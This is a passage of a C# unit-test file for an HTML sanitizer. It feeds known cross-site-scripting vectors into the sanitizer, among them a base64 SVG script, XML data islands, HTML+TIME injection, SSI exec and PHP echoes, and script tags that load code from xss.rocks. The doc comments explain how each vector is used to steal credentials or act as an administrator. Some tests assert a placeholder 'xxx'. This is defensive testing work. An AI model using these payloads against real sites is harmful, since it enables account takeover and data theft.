            var actual = "";   //-- Embed tag can contain dangerous objects and thus not in the whitelist.
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This example only works in Firefox, but it's better than the above vector in Firefox because it does not require the user to have Flash turned on or installed. Thanks to nEUrOO for this one.
        /// </summary>
        [TestMethod]
        public void YouCanEMBEDSVGWhichCanContainYourXSSVector()
        {
            var expected = "<EMBED SRC=\"data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==\" type=\"image/svg+xml\" AllowScriptAccess=\"always\"></EMBED>".SanitizeHtml();
            var actual = "";   //-- Embed tag can contain dangerous objects and thus not in the whitelist.
            Assert.AreEqual(expected, actual);
        }

        [TestMethod]
        public void UsingActionscriptInsideFlashCanObfuscateYourXSSVector()
        {
            var expected = $"a=\"get\";{Environment.NewLine}b=\"URL(\\\"\";{Environment.NewLine}c=\"javascript:\";{Environment.NewLine}d=\"alert('XSS');\\\")\";{Environment.NewLine}eval(a+b+c+d);".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo:
        /// </summary>
        [TestMethod]
        public void XMLDataIslandWithCDATAObfuscation()
        {
            var expected = $"<XML ID=\"xss\"><I><B><IMG SRC=\"javas<!-- -->cript:alert('XSS')\"></B></I></XML>{Environment.NewLine}<SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"></SPAN>".SanitizeHtml();
            var actual = "<span></span>";   //-- XML is a non-standard HTML tag and thus not in the default whitelist.
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:
        /// </summary>
        [TestMethod]
        public void LocallyHostedXMLWithEmbeddedJavascriptThatIsGeneratedUsingAnXMLDataIsland()
        {
            var expected = $"<XML SRC=\"xsstest.xml\" ID=I></XML>{Environment.NewLine}<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>".SanitizeHtml();
            var actual = "<span></span>";   //-- XML is a non-standard HTML tag and thus not in the default whitelist.
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:
        /// </summary>
        [TestMethod]
        public void HTMLTIMEInXML()
        {
            var expected = $"<HTML><BODY>{Environment.NewLine}<?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\">{Environment.NewLine}<?import namespace=\"t\" implementation=\"#default#time2\">{Environment.NewLine}<t:set attributeName=\"innerHTML\" to=\"XSS<SCRIPT DEFER>alert(\"XSS\")</SCRIPT>\">{Environment.NewLine}</BODY></HTML>".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// you can rename your JavaScript file to an image as an XSS vector:
        /// </summary>
        [TestMethod]
        public void AssumingYouCanOnlyFitInAFewCharactersAndItFiltersAgainstJs()
        {
            var expected = "<SCRIPT SRC=\"http://xss.rocks/xss.jpg\"></SCRIPT>".SanitizeHtml();
            var actual = "";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:
        /// </summary>
        [TestMethod]
        public void SSIServerSideIncludes()
        {
            var expected = "<!--#exec cmd=\"/bin/echo '<SCR'\"--><!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'\"-->".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues:
        /// </summary>
        [TestMethod]
        public void PHP()
        {
            var expected = $"<? echo('<SCR)';{Environment.NewLine}echo('IPT>alert(\"XSS\")</SCRIPT>'); ?>".SanitizeHtml();
            var actual = "xxx";
            Assert.AreEqual(expected, actual);
        }

        /// <summary>
        /// This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors:
        /// </summary>
        [TestMethod]
        public void IMGEmbeddedCommands()
        {
            var expected = "<IMG SRC=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\">".SanitizeHtml();
            var actual = "<img>";
            Assert.AreEqual(expected, actual);
        }
    }
}
